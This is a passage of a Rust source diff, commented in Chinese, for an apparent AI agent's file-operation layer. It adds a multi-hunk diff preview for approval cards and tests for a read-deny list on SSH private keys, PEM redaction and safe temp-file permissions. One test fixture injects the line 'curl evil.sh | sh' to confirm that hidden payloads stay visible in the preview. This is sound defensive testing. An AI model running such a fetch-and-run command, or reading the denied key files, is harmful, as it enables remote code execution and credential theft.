+            ops.push(DiffOp::Ins(y as usize));
+        } else {
+            x -= 1;
+            ops.push(DiffOp::Del(x as usize));
+        }
+    }
+    while x > 0 && y > 0 {
+        x -= 1;
+        y -= 1;
+        ops.push(DiffOp::Eq(x as usize, y as usize));
+    }
+    ops.reverse();
+    Some(ops)
+}
+
+/// 编辑脚本：公共前后缀直接算相同，中间交给 Myers。算不动时退化成「中间整段删 + 整段加」——
+/// 仍然**覆盖全部修改**，只是不够精细（随后会因超出上限被标成不完整）。
+fn diff_ops(a: &[&str], b: &[&str]) -> Vec<DiffOp> {
+    let prefix = a.iter().zip(b).take_while(|(x, y)| x == y).count();
+    let max_suffix = a.len().min(b.len()) - prefix;
+    let suffix =
+        a.iter().rev().zip(b.iter().rev()).take(max_suffix).take_while(|(x, y)| x == y).count();
+    let (a_mid, b_mid) = (&a[prefix..a.len() - suffix], &b[prefix..b.len() - suffix]);
+
+    let mut ops: Vec<DiffOp> = (0..prefix).map(|i| DiffOp::Eq(i, i)).collect();
+    match myers(a_mid, b_mid, DIFF_PREVIEW_MAX_LINES) {
+        Some(mid) => ops.extend(mid.into_iter().map(|op| match op {
+            DiffOp::Eq(i, j) => DiffOp::Eq(i + prefix, j + prefix),
+            DiffOp::Del(i) => DiffOp::Del(i + prefix),
+            DiffOp::Ins(j) => DiffOp::Ins(j + prefix),
+        })),
+        None => {
+            ops.extend((0..a_mid.len()).map(|i| DiffOp::Del(i + prefix)));
+            ops.extend((0..b_mid.len()).map(|j| DiffOp::Ins(j + prefix)));
+        }
+    }
+    let (a_end, b_end) = (a.len() - suffix, b.len() - suffix);
+    ops.extend((0..suffix).map(|t| DiffOp::Eq(a_end + t, b_end + t)));
+    ops
+}
+
+/// 多区块 unified diff：每处修改各成一个 hunk（带 [`DIFF_CONTEXT`] 行上下文，相距近的合并），
+/// 所以分散在文件各处的修改**全部**可见。总行数超过 [`DIFF_PREVIEW_MAX_LINES`] 才截断。
+///
+/// 返回 (文本, 是否完整)。不完整时文本第一行以 [`DIFF_INCOMPLETE_MARK`] 开头，
+/// 审批卡据此出横幅；调用方据此强制审批（见 [`PendingChange::preview_complete`]）。
+pub fn diff_preview(path: &str, before: &str, after: &str) -> (String, bool) {
+    if before == after {
+        return ("（内容无变化）".into(), true);
+    }
     let a: Vec<&str> = before.lines().collect();
     let b: Vec<&str> = after.lines().collect();
-    if before == after {
-        return "（内容无变化）".into();
+    let ops = diff_ops(&a, &b);
+    // 每个 op 之前 a / b 已走过的行数
+    let mut pos = Vec::with_capacity(ops.len() + 1);
+    let (mut ai, mut bi) = (0usize, 0usize);
+    for op in &ops {
+        pos.push((ai, bi));
+        match op {
+            DiffOp::Eq(..) => {
+                ai += 1;
+                bi += 1;
+            }
+            DiffOp::Del(_) => ai += 1,
+            DiffOp::Ins(_) => bi += 1,
+        }
     }
-    let prefix = a.iter().zip(&b).take_while(|(x, y)| x == y).count();
-    let max_suffix = a.len().min(b.len()) - prefix;
-    let suffix = a
-        .iter()
-        .rev()
-        .zip(b.iter().rev())
-        .take(max_suffix)
-        .take_while(|(x, y)| x == y)
-        .count();
-    let ctx_start = prefix.saturating_sub(DIFF_CONTEXT);
-    let a_end = a.len() - suffix;
-    let b_end = b.len() - suffix;
-    let ctx_end_a = (a_end + DIFF_CONTEXT).min(a.len());
-    let tail = ctx_end_a - a_end;
+    pos.push((ai, bi));
 
-    let a_count = ctx_end_a - ctx_start;
-    let b_count = (b_end + tail) - ctx_start;
-    // diff -u 约定：区间为空时起始行号取前一行
-    let a_from = if a_count == 0 { ctx_start } else { ctx_start + 1 };
-    let b_from = if b_count == 0 { ctx_start } else { ctx_start + 1 };
+    let changes: Vec<usize> =
+        ops.iter().enumerate().filter(|(_, op)| !matches!(op, DiffOp::Eq(..))).map(|(i, _)| i).collect();
+    // 相邻修改之间的相同行不超过 2×上下文就并成一个 hunk
+    let mut hunks: Vec<(usize, usize)> = Vec::new();
+    for &c in &changes {
+        match hunks.last_mut() {
+            Some((_, last)) if c - *last <= 2 * DIFF_CONTEXT + 1 => *last = c,
+            _ => hunks.push((c, c)),
+        }
+    }
 
-    let mut lines = vec![
-        format!("--- a{path}"),
-        format!("+++ b{path}"),
-        format!("@@ -{a_from},{a_count} +{b_from},{b_count} @@"),
-    ];
-    lines.extend(a[ctx_start..prefix].iter().map(|l| format!(" {l}")));
-    lines.extend(a[prefix..a_end].iter().map(|l| format!("-{l}")));
-    lines.extend(b[prefix..b_end].iter().map(|l| format!("+{l}")));
-    lines.extend(a[a_end..ctx_end_a].iter().map(|l| format!(" {l}")));
+    let mut lines = vec![format!("--- a{path}"), format!("+++ b{path}")];
+    for (first, last) in hunks {
+        let s = first.saturating_sub(DIFF_CONTEXT);
+        let e = (last + 1 + DIFF_CONTEXT).min(ops.len());
+        let (a0, b0) = pos[s];
+        let (a1, b1) = pos[e];
+        let (a_count, b_count) = (a1 - a0, b1 - b0);
+        // diff -u 约定：区间为空时起始行号取前一行
+        let a_from = if a_count == 0 { a0 } else { a0 + 1 };
+        let b_from = if b_count == 0 { b0 } else { b0 + 1 };
+        lines.push(format!("@@ -{a_from},{a_count} +{b_from},{b_count} @@"));
+        for op in &ops[s..e] {
+            lines.push(match *op {
+                DiffOp::Eq(i, _) => format!(" {}", a[i]),
+                DiffOp::Del(i) => format!("-{}", a[i]),
+                DiffOp::Ins(j) => format!("+{}", b[j]),
+            });
+        }
+    }
 
     if lines.len() > DIFF_PREVIEW_MAX_LINES {
         let dropped = lines.len() - DIFF_PREVIEW_MAX_LINES;
         lines.truncate(DIFF_PREVIEW_MAX_LINES);
         lines.push(format!("…（差异过长，省略 {dropped} 行）"));
+        lines.insert(
+            0,
+            format!("{DIFF_INCOMPLETE_MARK}：差异共 {} 行，只显示前 {DIFF_PREVIEW_MAX_LINES} 行；批准即按完整内容写入", dropped + DIFF_PREVIEW_MAX_LINES),
+        );
+        return (lines.join("\n"), false);
     }
-    lines.join("\n")
+    (lines.join("\n"), true)
+}
+
+/// 只要文本的 [`diff_preview`]
+pub fn unified_diff(path: &str, before: &str, after: &str) -> String {
+    diff_preview(path, before, after).0
 }
 
 // ——————————————————————————————— 工具声明 ———————————————————————————————
@@ -1641,6 +2039,8 @@ pub mod fake {
         pub ops: parking_lot::Mutex<Vec<String>>,
         /// 符号链接模拟：realpath 映射
         pub links: parking_lot::Mutex<BTreeMap<String, String>>,
+        /// 硬链接数模拟（没登记的视为 1）
+        pub nlinks: parking_lot::Mutex<BTreeMap<String, u64>>,
         clock: parking_lot::Mutex<u64>,
     }
 
@@ -1654,6 +2054,7 @@ pub mod fake {
                 fail_next_write: parking_lot::Mutex::new(false),
                 ops: parking_lot::Mutex::new(Vec::new()),
                 links: parking_lot::Mutex::new(BTreeMap::new()),
+                nlinks: parking_lot::Mutex::new(BTreeMap::new()),
                 clock: parking_lot::Mutex::new(1000),
             };
             t.add_dir("/");
@@ -1784,6 +2185,26 @@ pub mod fake {
                 .lock()
                 .insert(path.into(), Node::File { bytes: bytes.to_vec(), mode: 0o100600, mtime });
             Ok(())
+        }
+
+        async fn create_with_mode(&self, path: &str, bytes: &[u8], m: Option<u32>) -> Result<(), FileError> {
+            if self.nodes.lock().contains_key(path) {
+                return Err(FileError::Io(format!("{path} 已存在")));
+            }
+            let r = self.write(path, bytes).await;
+            // 记下「创建时」的权限：测试据此断言临时文件从诞生起就不是全世界可读
+            let born = m.map(|m| 0o100000 | (m & 0o7777)).unwrap_or(0o100644);
+            if let Some(op) = self.ops.lock().last_mut() {
+                op.push_str(&format!(" mode {:o}", born & 0o7777));
+            }
+            if let Some(Node::File { mode, .. }) = self.nodes.lock().get_mut(path) {
+                *mode = born;
+            }
+            r
+        }
+
+        async fn link_count(&self, path: &str) -> Option<u64> {
+            Some(self.nlinks.lock().get(path).copied().unwrap_or(1))
         }
 
         async fn set_mode(&self, path: &str, m: u32) -> Result<(), FileError> {
@@ -1994,8 +2415,75 @@ mod tests {
             Err(FileError::TooLarge { size, cap, .. }) => assert_eq!((size, cap), (2048, 1024)),
             other => panic!("应当超限：{other:?}"),
         }
-        assert!(o.read("~/.ssh/id_rsa", None, None).await.unwrap().sensitive);
+        // 禁读清单：不批准只有元数据
+        match o.read("~/.ssh/id_rsa", None, None).await {
+            Err(FileError::ReadDenied { path, size }) => assert_eq!((path.as_str(), size), ("/home/u/.ssh/id_rsa", 40)),
+            other => panic!("应当拒读：{other:?}"),
+        }
+        let r = o.read_with("~/.ssh/id_rsa", None, None, true).await.unwrap();
+        assert!(r.sensitive && !r.content.contains("BEGIN"), "{}", r.content);
         assert!(!o.read("~/plain", None, None).await.unwrap().sensitive);
+    }
+
+    const RSA_PEM: &str = concat!(
+        "-----BEGIN RSA PRIVATE KEY-----\n",
+        "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun\n",
+        "VTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u+qKhbwKfBstIs+bMY2Zkp18gnTxK\n",
+        "LxoS2tFczGkPLPgizskuemMghRniWaoLcyehkd3qqGElvW/VDL5AaWTg0nLVkjRo\n",
+        "-----END RSA PRIVATE KEY-----\n"
+    );
+    const RSA_BODIES: [&str; 3] = ["MIIEowIBAAKCAQEAu1SU1Lf", "VTLw7onLRnrq0", "LxoS2tFczGkPLPg"];
+
+    /// 行号是在脱敏**之后**加的：PEM 正文一行都不能漏；行号仍与真实文件一致
+    #[tokio::test]
+    async fn read_never_leaks_pem_body_even_with_line_numbers_or_offset() {
+        let t = FakeTransport::new(HOME);
+        let file = format!("# deploy key\n{RSA_PEM}tail line\n");
+        t.add_file("/home/u/proj/deploy_key", file.as_bytes());
+        let o = ops(&t);
+        for (off, lim) in [(None, None), (Some(3), Some(2)), (Some(4), None)] {
+            let r = o.read("~/proj/deploy_key", off, lim).await.unwrap();
+            for b in RSA_BODIES {
+                assert!(!r.content.contains(b), "offset {off:?} 漏了 {b}：{}", r.content);
+            }
+            assert!(r.sensitive);
+        }
+        let r = o.read("~/proj/deploy_key", None, None).await.unwrap();
+        assert_eq!(r.total_lines, 7);
+        assert!(r.content.contains("     7\ttail line"), "{}", r.content);
+        assert_eq!(r.sha256, sha256_hex(file.as_bytes()), "哈希是原文的");
+
+        // grep 同理：匹配用原文，展示用整份脱敏后的行
+        let g = o.grep(Some("~/proj"), "[A-Za-z]", None, false, 100).await.unwrap();
+        let text = g.to_model_text();
+        for b in RSA_BODIES {
+            assert!(!text.contains(b), "grep 漏了 {b}：{text}");
+        }
+        assert!(g.sensitive && text.contains("tail line"));
+    }
+
+    #[tokio::test]
+    async fn grep_skips_read_denied_files() {
+        let t = FakeTransport::new(HOME);
+        t.add_file("/home/u/.ssh/id_ed25519", b"needle secret\n");
+        t.add_file("/home/u/notes.txt", b"needle here\n");
+        let o = ops(&t);
+        let g = o.grep(Some("~"), "needle", None, false, 10).await.unwrap();
+        assert_eq!(g.matches.len(), 1);
+        assert_eq!(g.matches[0].path, "/home/u/notes.txt");
+        assert_eq!(g.skipped_protected, 1);
+        assert!(g.to_model_text().contains("需要用户批准才能读取"));
+        assert!(matches!(o.grep(Some("~/.ssh/id_ed25519"), "x", None, false, 10).await, Err(FileError::ReadDenied { .. })));
+        // 禁读清单的通配符规则
+        let t = FakeTransport::new(HOME);
+        t.add_file("/etc/ssh/ssh_host_ed25519_key", b"k\n");
+        t.add_file("/etc/ssh/ssh_host_ed25519_key.pub", b"k\n");
+        t.add_file("/etc/ssh/sshd_config", b"Port 22\n");
+        let o = ops(&t);
+        assert!(o.is_read_denied("/etc/ssh/ssh_host_ed25519_key").await.unwrap());
+        assert!(!o.is_read_denied("/etc/ssh/ssh_host_ed25519_key.pub").await.unwrap());
+        assert!(o.read("/etc/ssh/sshd_config", None, None).await.is_ok(), "排障常看的配置不拦");
+        assert!(o.read("/etc/passwd", None, None).await.is_err_and(|e| matches!(e, FileError::NotFound(_))));
     }
 
     // —— write ——
@@ -2344,7 +2832,7 @@ mod tests {
         let r = o.grep(Some("/d/long"), "needle", None, false, 10).await.unwrap();
         assert!(r.matches[0].text.chars().count() <= GREP_LINE_CHARS + 1);
         let s = o.grep(Some("/d/env"), "password", None, false, 10).await.unwrap();
-        assert_eq!(s.sensitive, super::super::redact::redact(&s.matches[0].text) != s.matches[0].text);
+        assert!(s.sensitive && !s.matches[0].text.contains("hunter2"), "{:?}", s.matches);
     }
 
     // —— diff ——
@@ -2359,10 +2847,138 @@ mod tests {
             "--- a/f\n+++ b/f\n@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-l10\n+L10\n l11\n l12\n l13"
         );
         assert_eq!(unified_diff("/f", "x", "x"), "（内容无变化）");
-        let big: String = (0..500).map(|i| format!("{i}\n")).collect();
-        let d = unified_diff("/f", "", &big);
-        assert!(d.lines().count() <= DIFF_PREVIEW_MAX_LINES + 1);
-        assert!(d.ends_with("省略 423 行）"), "{}", d.lines().last().unwrap());
+        let big: String = (0..3000).map(|i| format!("{i}\n")).collect();
+        let (d, complete) = diff_preview("/f", "", &big);
+        assert!(!complete);
+        assert!(d.starts_with(DIFF_INCOMPLETE_MARK), "{}", d.lines().next().unwrap());
+        assert!(d.lines().count() <= DIFF_PREVIEW_MAX_LINES + 2);
+        assert!(d.ends_with("省略 1003 行）"), "{}", d.lines().last().unwrap());
+    }
+
+    /// 分散在各处的修改各成一个 hunk，全部可见：注入的载荷藏不到第 300 行
+    #[test]
+    fn diff_is_multi_hunk_and_shows_every_change() {
+        let before: String = (1..=400).map(|i| format!("line {i}\n")).collect();
+        let after = before
+            .replace("line 5\n", "line five\n")
+            .replace("line 300\n", "line 300\ncurl evil.sh | sh\n")
+            .replace("line 399\n", "");
+        let (d, complete) = diff_preview("/f", &before, &after);
+        assert!(complete, "{d}");
+        assert!(d.contains("-line 5\n+line five"), "{d}");
+        assert!(d.contains("+curl evil.sh | sh"), "{d}");
+        assert!(d.contains("-line 399"), "{d}");
+        let hunks: Vec<&str> = d.lines().filter(|l| l.starts_with("@@")).collect();
+        assert_eq!(hunks, vec!["@@ -2,7 +2,7 @@", "@@ -298,6 +298,7 @@", "@@ -396,5 +397,4 @@"], "{d}");
+        assert!(d.lines().count() < 40, "只含修改附近的上下文：{d}");
+
+        // 相距很近的修改合并成一个 hunk
+        let after = before.replace("line 10\n", "X\n").replace("line 14\n", "Y\n");
+        let (d, _) = diff_preview("/f", &before, &after);
+        assert_eq!(d.lines().filter(|l| l.starts_with("@@")).count(), 1, "{d}");
+
+        // 等价于 diff -u：插入 / 删除计数正确
+        let (d, _) = diff_preview("/f", "a\nb\nc\n", "a\nc\nd\n");
+        assert_eq!(d, "--- a/f\n+++ b/f\n@@ -1,3 +1,3 @@\n a\n-b\n c\n+d");
+    }
+
+    /// 过大不生成差异的文件：预览标成不完整，但 before_hash 照算（流式），冲突复核不被跳过
+    #[tokio::test]
+    async fn oversized_original_still_gets_before_hash_and_conflict_check() {
+        let t = FakeTransport::new(HOME);
+        let big = vec![b'a'; 64];
+        t.add_file("/home/u/huge.log", &big);
+        let o = ops_with(&t, |c| {
+            c.read_cap = 16;
+            c.write_cap = 16;
+        });
+        let p = o.prepare_write("~/huge.log", "small", &WriteOptions::default()).await.unwrap();
+        assert!(!p.preview_complete && !p.change.preview_complete);
+        assert!(p.change.diff_preview.starts_with(DIFF_INCOMPLETE_MARK), "{}", p.change.diff_preview);
+        assert_eq!(p.change.before_hash.as_deref(), Some(sha256_hex(&big).as_str()));
+        t.add_file("/home/u/huge.log", &vec![b'b'; 64]);
+        assert!(matches!(o.commit(&p).await, Err(FileError::Conflict(_))), "审批期间被改过要拒绝");
+
+        // 二进制原文件同样不完整
+        t.add_file("/home/u/bin", b"\0\x01\x02");
+        let p = o.prepare_write("~/bin", "text", &WriteOptions::default()).await.unwrap();
+        assert!(!p.preview_complete);
+        // 普通小改动是完整的
+        t.add_file("/home/u/s", b"a\n");
+        assert!(o.prepare_write("~/s", "b\n", &WriteOptions::default()).await.unwrap().preview_complete);
+    }
+
+    /// 0600 的文件：临时文件创建时就是 0600（不经过全世界可读的一刻）
+    #[tokio::test]
+    async fn temp_file_is_born_with_original_mode() {
+        let mut t = FakeTransport::new(HOME);
+        t.posix_rename = true;
+        t.add_file("/home/u/.env", b"A=1\n");
+        t.set_permissions_for_test("/home/u/.env", 0o600);
+        let o = ops(&t);
+        o.write("~/.env", "A=2\n", &WriteOptions::default()).await.unwrap();
+        let log = t.ops.lock().clone();
+        assert!(log[0].starts_with("write /home/u/..env.nxtmp-") && log[0].ends_with(" mode 600"), "{log:?}");
+        assert_eq!(t.mode("/home/u/.env").unwrap() & 0o777, 0o600);
+    }
+
+    /// 多个硬链接：原地重写（不原子），不把它从其它链接上拆开
+    #[tokio::test]
+    async fn hardlinked_target_is_rewritten_in_place() {
+        let mut t = FakeTransport::new(HOME);
+        t.posix_rename = true;
+        t.add_file("/home/u/h", b"old\n");
+        t.nlinks.lock().insert("/home/u/h".into(), 2);
+        let o = ops(&t);
+        let ch = o.write("~/h", "new\n", &WriteOptions::default()).await.unwrap();
+        assert!(!ch.atomic);
+        assert_eq!(t.get("/home/u/h").unwrap(), b"new\n");
+        let log = t.ops.lock().clone();
+        assert_eq!(log, vec!["write /home/u/h".to_string()], "没有临时文件和改名");
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn local_replace_keeps_symlink_mode_and_hardlinks() {
+        use std::os::unix::fs::{MetadataExt, PermissionsExt};
+        let dir = TempDir::new();
+        let t = LocalTransport::with_home(dir.path(""));
+        let o = FileOps::new(&t, FileOpsConfig::default());
+
+        // 符号链接：链接保留，内容写到它指向的文件
+        let real = dir.path("real.conf");
+        let link = dir.path("link.conf");
+        std::fs::write(&real, "v1\n").unwrap();
+        std::os::unix::fs::symlink(&real, &link).unwrap();
+        let ch = o.write(&link, "v2\n", &WriteOptions::default()).await.unwrap();
+        assert!(ch.atomic);
+        assert!(std::fs::symlink_metadata(&link).unwrap().file_type().is_symlink(), "链接不能被换成普通文件");
+        assert_eq!(std::fs::read_to_string(&real).unwrap(), "v2\n");
+
+        // 0600：结果仍是 0600；临时文件在创建那一刻就是 0600
+        let secret = dir.path("secret");
+        std::fs::write(&secret, "s1\n").unwrap();
+        std::fs::set_permissions(&secret, std::fs::Permissions::from_mode(0o600)).unwrap();
+        o.write(&secret, "s2\n", &WriteOptions::default()).await.unwrap();
+        assert_eq!(std::fs::metadata(&secret).unwrap().permissions().mode() & 0o777, 0o600);
+        let tmp = dir.path(".probe.nxtmp-x");
+        t.create_with_mode(&tmp, b"x", Some(0o600)).await.unwrap();
+        assert_eq!(std::fs::metadata(&tmp).unwrap().permissions().mode() & 0o077, 0, "临时文件不能对组 / 其他人可读");
+        assert!(t.create_with_mode(&tmp, b"y", Some(0o600)).await.is_err(), "临时文件必须是新建的，不跟随已存在的路径");
+
+        // 硬链接：原地重写，两个名字仍是同一个 inode
+        let h1 = dir.path("h1");
+        let h2 = dir.path("h2");
+        std::fs::write(&h1, "old\n").unwrap();
+        std::fs::hard_link(&h1, &h2).unwrap();
+        let ino = std::fs::metadata(&h1).unwrap().ino();
+        let ch = o.write(&h1, "new\n", &WriteOptions::default()).await.unwrap();
+        assert!(!ch.atomic, "硬链接走原地重写，要如实报告");
+        assert_eq!(std::fs::metadata(&h1).unwrap().ino(), ino);
+        assert_eq!(std::fs::read_to_string(&h2).unwrap(), "new\n");
+
+        // 大文件的 before_hash：流式计算与整读一致
+        assert_eq!(t.sha256(&h2).await.unwrap(), sha256_hex(b"new\n"));
     }
 
     // —— 工具声明 ——
